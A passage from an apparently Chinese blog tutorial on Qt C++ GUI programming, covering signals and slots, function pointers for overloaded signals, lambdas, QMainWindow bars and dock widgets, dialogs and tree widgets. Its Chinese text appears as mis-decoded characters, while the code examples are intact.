ç¨‹åºè¾“å‡ºæ¥å—æˆåŠŸ</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆå¾—æœ‰ä¸¤ä¸ªç±»</p><ol><li>button</li><li>recv</li></ol><p>ç„¶åå¾—æœ‰<strong>ä¿¡å· æ§½å‡½æ•° å®šä¹‰æ§½å‡½æ•° </strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯è¿æ¥,è¿™é‡Œæˆ‘ä»¬<strong>éœ€è¦æ³¨æ„åªæœ‰rangä¹‹åæ‰ä¼šæ¥å—</strong></p><p>æ‰€ä»¥å°±éœ€è¦rangèµ·æ¥ï¼Œ<strong>è¿™é‡Œç”¨çš„plzå‡½æ•°è®©å®ƒrang</strong></p><p>å…¶ä¸­çš„ä¸€äº›æˆå‘˜åéœ€è¦åœ¨<code>widget.h</code>ä¸­æ˜¯å®ç°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-é‡è½½ä¿¡å·å’Œæ§½"><a href="#2-é‡è½½ä¿¡å·å’Œæ§½" class="headerlink" title="2.é‡è½½ä¿¡å·å’Œæ§½"></a>2.é‡è½½ä¿¡å·å’Œæ§½</h3><p>æ¥ç€ä¸Šä¸ªæ¡ˆä¾‹</p><p><strong>é‡è½½ä¿¡å· é‡è½½æ§½ é‡æ–°å®šä¹‰æ§½å‡½æ•°</strong> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸå“é“ƒ"</span> &lt;&lt; second &lt;&lt; <span class="string">"ç§’"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºè¿æ¥æ— æ³•åˆ†æ¸…å‡½æ•°åœ°å€ï¼Œè¿™é‡Œç”¨<strong>å‡½æ•°æŒ‡é’ˆæ¥ä½“ç°å‡½æ•°åœ°å€</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç®€å•è¯´ä¸€ä¸‹å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">//è¿”å›ç±»å‹ä¸ºç©º ç¬¬ä¸€ä¸ªæ‹¬å·é‡Œä¸ºæŒ‡é’ˆ ç¬¬äºŒä¸ªæ‹¬å·ä¸ºå‚æ•° =åé¢æ˜¯éœ€è¦æŒ‡å‘å‡½æ•°çš„åœ°å€</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure><p>æˆåŠŸå®ç°</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p><blockquote><p>Qstringæ€ä¹ˆå»æ‰å¼•å·</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-ä¿¡å·å’Œæ§½çš„æ‹“å±•"><a href="#3-ä¿¡å·å’Œæ§½çš„æ‹“å±•" class="headerlink" title="3.ä¿¡å·å’Œæ§½çš„æ‹“å±•"></a>3.ä¿¡å·å’Œæ§½çš„æ‹“å±•</h3><ul><li>ä¿¡å·å¯ä»¥è¿æ¥ä¿¡å·</li><li>ä¸€ä¸ªä¿¡å·å¯ä»¥è¿æ¥å¤šä¸ªæ§½å‡½æ•°</li><li>å¤šä¸ªä¿¡å·å¯ä»¥è¿æ¥åŒä¸€ä¸ªæ§½å‡½æ•°</li><li><strong>ä¿¡å·å’Œæ§½å‡½æ•°çš„ç±»å‹å¿…é¡»ä¸€ä¸€å¯¹åº”</strong></li><li>ä¿¡å·çš„å‚æ•°ä¸ªæ•°å¯ä»¥å¤§äºæ§½å‡½æ•°çš„å‚æ•°ä¸ªæ•°</li></ul><h4 id="ä¿¡å·è¿æ¥ä¿¡å·"><a href="#ä¿¡å·è¿æ¥ä¿¡å·" class="headerlink" title="ä¿¡å·è¿æ¥ä¿¡å·"></a>ä¿¡å·è¿æ¥ä¿¡å·</h4><p>ç»§ç»­ä¸‹ä¸€ä¸ª</p><p><strong>æˆ‘ä»¬æŒ‰ä¸‹æŒ‰é’®1æ‰ä¼šå“é“ƒ</strong></p><p>è¿™é‡Œç”¨ä¸¤ç§å®ç°</p><ol><li>ç‚¹å‡»è¿æ¥plzå‡½æ•°</li><li><strong>ç‚¹å‡»è¿æ¥å“é“ƒä¿¡å·</strong>,æ­¤æ—¶å‡½æ•°ä¸­æ— å‚æ•°</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾å¦‚ä¸‹</p><p>æ–¹æ³•1</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p><p>æ–¹æ³•2</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p><h3 id="4-Lambdaè¡¨è¾¾å¼"><a href="#4-Lambdaè¡¨è¾¾å¼" class="headerlink" title="4.Lambdaè¡¨è¾¾å¼"></a>4.Lambdaè¡¨è¾¾å¼</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">btn1-&gt;setText(<span class="string">"ç¬¬äºŒä¸ª"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()è°ƒç”¨</span></span><br><span class="line"><span class="comment">//[]å¿…é¡»å­˜åœ¨ ä¸å¯çœç•¥</span></span><br><span class="line"><span class="comment">//()é‡è½½å‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="comment">//= å€¼ä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp; å¼•ç”¨ä¼ é€’</span></span><br><span class="line"><span class="comment">//a åªå¯¹aä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp;a åªå¯¹å¼•ç”¨aä¼ é€’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹äºæƒ³è¦å€¼ä¿®æ”¹ï¼Œéœ€è¦mutableå…³é”®å­—,ä½†ä¸æ”¹å˜æœ¬ä½“</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//è¿”å›å€¼ -&gt;è¿”å›å€¼ç±»å‹</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure><h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p><h3 id="1-èœå•æ "><a href="#1-èœå•æ " class="headerlink" title="1.èœå•æ "></a>1.èœå•æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//èœå•æ </span></span><br><span class="line"><span class="comment">//èœå•æ æœ€å¤šæœ‰ä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•æ </span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//å°†èœå•æ æ”¾å…¥åˆ°çª—å£ä¸­</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"æ–‡ä»¶"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"ç¼–è¾‘"</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•é¡¹</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("æ–°å»º");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"æ–°å»º"</span>);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†éš”ç¬¦</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"æ‰“å¼€"</span>);</span><br></pre></td></tr></table></figure><h3 id="2-å·¥å…·æ "><a href="#2-å·¥å…·æ " class="headerlink" title="2.å·¥å…·æ "></a>2.å·¥å…·æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å·¥å…·æ </span></span><br><span class="line"><span class="comment">//å·¥å…·æ  å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//å·¥å…·æ åŒºåŸŸ</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//è®¾ç½®å·¥å…·æ åŒºåŸŸ åªå…è®¸å·¦å³åœé </span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//è®¾ç½®æµ®åŠ¨</span></span><br><span class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ç§»åŠ¨</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®å†…å®¹</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("æ–°å»º");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†å‰²çº¿</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//å·¥å…·æ æ·»åŠ æ§ä»¶</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"ç‚¹è¿™é‡Œ"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure><h3 id="3-çŠ¶æ€æ "><a href="#3-çŠ¶æ€æ " class="headerlink" title="3.çŠ¶æ€æ "></a>3.çŠ¶æ€æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//çŠ¶æ€æ </span></span><br><span class="line"><span class="comment">//çŠ¶æ€æ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//è®¾ç½®åˆ°çª—å£</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//æ·»åŠ æ ‡ç­¾æ§ä»¶</span></span><br><span class="line"><span class="comment">//å·¦ä¾§æç¤º</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"å·¦ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//å³ä¾§æç¤º</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"å³ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure><h3 id="4-æµ®åŠ¨çª—å£"><a href="#4-æµ®åŠ¨çª—å£" class="headerlink" title="4.æµ®åŠ¨çª—å£"></a>4.æµ®åŠ¨çª—å£</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶(æµ®åŠ¨çª—å£)</span></span><br><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"æµ®åŠ¨"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//è®¾ç½®åœé åŒºåŸŸ</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure><h3 id="5-æ ¸å¿ƒéƒ¨ä»¶"><a href="#5-æ ¸å¿ƒéƒ¨ä»¶" class="headerlink" title="5.æ ¸å¿ƒéƒ¨ä»¶"></a>5.æ ¸å¿ƒéƒ¨ä»¶</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®ä¸­å¿ƒéƒ¨ä»¶(åªèƒ½æœ‰ä¸€ä¸ª)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure><h2 id="0x05-èµ„æºæ–‡ä»¶"><a href="#0x05-èµ„æºæ–‡ä»¶" class="headerlink" title="0x05 èµ„æºæ–‡ä»¶"></a>0x05 èµ„æºæ–‡ä»¶</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p><h2 id="0x06-å¯¹è¯æ¡†"><a href="#0x06-å¯¹è¯æ¡†" class="headerlink" title="0x06 å¯¹è¯æ¡†"></a>0x06 å¯¹è¯æ¡†</h2><h3 id="1-åŸºæœ¬æ¦‚å¿µ"><a href="#1-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1.åŸºæœ¬æ¦‚å¿µ"></a>1.åŸºæœ¬æ¦‚å¿µ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–°å»ºæŒ‰é’® å¼¹å‡ºå¯¹è¯æ¡†</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class="line">        <span class="comment">//æ¨¡æ€å¯¹è¯æ¡† ï¼ˆä¸å¯ä»¥å¯¹å…¶å®ƒçª—å£è¿›è¡Œæ“ä½œï¼‰</span></span><br><span class="line">        <span class="comment">//éæ¨¡æ€å¯¹è¯æ¡† ï¼ˆå¯ä»¥å¯¹å…¶ä»–çª—å£è¿›è¡Œæ“ä½œï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ¨¡æ€å¯¹è¯æ¡†çš„åˆ›å»º</span></span><br><span class="line">        QDialog dlg(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//å¯¹è¯æ¡†çš„å¤§å°</span></span><br><span class="line">        dlg.resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//å¯¹è¯æ¡†é˜»å¡</span></span><br><span class="line">        dlg.exec();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éæ¨¡æ€å¯¹è¯æ¡†</span></span><br><span class="line">        QDialog *dlg2 = <span class="keyword">new</span> QDialog(<span class="keyword">this</span>);</span><br><span class="line">        dlg2-&gt;resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        dlg2-&gt;show();</span><br><span class="line">        <span class="comment">//å…³é—­é‡Šæ”¾å†…å­˜</span></span><br><span class="line">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="2-æ ‡å‡†å¯¹è¯æ¡†"><a href="#2-æ ‡å‡†å¯¹è¯æ¡†" class="headerlink" title="2.æ ‡å‡†å¯¹è¯æ¡†"></a>2.æ ‡å‡†å¯¹è¯æ¡†</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¶ˆæ¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//é”™è¯¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QMessageBox::critical(this,"é”™è¯¯","é”™è¯¯");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿¡æ¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QMessageBox::information(this,"æ¶ˆæ¯","æ¶ˆæ¯");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æé—®å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 æç¤ºå†…å®¹ å‚æ•°4 æŒ‰é”®ç±»å‹</span></span><br><span class="line">QMessageBox::question(<span class="keyword">this</span>,<span class="string">"æé—®"</span>,<span class="string">"æé—®"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class="line"><span class="keyword">if</span>(QMessageBox::Save==QMessageBox::question(<span class="keyword">this</span>,<span class="string">"æé—®"</span>,<span class="string">"æé—®"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"ä¿å­˜"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å…¶ä»–å¯¹è¯æ¡†"><a href="#3-å…¶ä»–å¯¹è¯æ¡†" class="headerlink" title="3.å…¶ä»–å¯¹è¯æ¡†"></a>3.å…¶ä»–å¯¹è¯æ¡†</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é¢œè‰²å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class="line"><span class="comment">//æ–‡ä»¶å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 ç›®å½• å‚æ•°4 æ–‡ä»¶æ ¼å¼</span></span><br><span class="line"><span class="comment">//QString str = QFileDialog::getOpenFileName(this,"æ‰“å¼€","c://","(*.txt)");</span></span><br><span class="line"><span class="comment">//å­—ä½“å¯¹è¯æ¡†</span></span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">QFontDialog::getFont(&amp;flag,QFont(<span class="string">"åæ–‡å½©äº‘"</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure><h2 id="0x07-ç•Œé¢å¸ƒå±€"><a href="#0x07-ç•Œé¢å¸ƒå±€" class="headerlink" title="0x07 ç•Œé¢å¸ƒå±€"></a>0x07 ç•Œé¢å¸ƒå±€</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png" alt="image-20201210092318304"></p><h2 id="0x08-æ§ä»¶"><a href="#0x08-æ§ä»¶" class="headerlink" title="0x08 æ§ä»¶"></a>0x08 æ§ä»¶</h2><h3 id="1-æŒ‰é’®"><a href="#1-æŒ‰é’®" class="headerlink" title="1.æŒ‰é’®"></a>1.æŒ‰é’®</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png" alt="image-20201210100503686"></p><h3 id="2-æ ‘æ§ä»¶"><a href="#2-æ ‘æ§ä»¶" class="headerlink" title="2.æ ‘æ§ä»¶"></a>2.æ ‘æ§ä»¶</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ‘æ§ä»¶çš„ä½¿ç”¨</span></span><br><span class="line"><span class="comment">//æ°´å¹³å¤´</span></span><br><span class="line">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class="string">"è‹±é›„"</span> &lt;&lt; <span class="string">"è‹±é›„ä»‹ç»"</span>);</span><br><span class="line"><span class="comment">//åŠ è½½é¡¶å±‚çš„èŠ‚ç‚¹</span></span><br><span class="line">QTreeWidgetItem * liitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"åŠ›é‡"</span>);</span><br><span class="line">QTreeWidgetItem * spitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"é€Ÿåº¦"</span>);</span><br><span class="line">QTreeWidgetItem * faitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"æ³•åŠ›"</span>);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure><h3 id="3-tableæ§ä»¶"><a href="#3-tableæ§ä»¶" class="headerlink" title="3.tableæ§ä»¶"></a>3.tableæ§ä»¶</h3><figure class="highlight c++"><table><tr><td 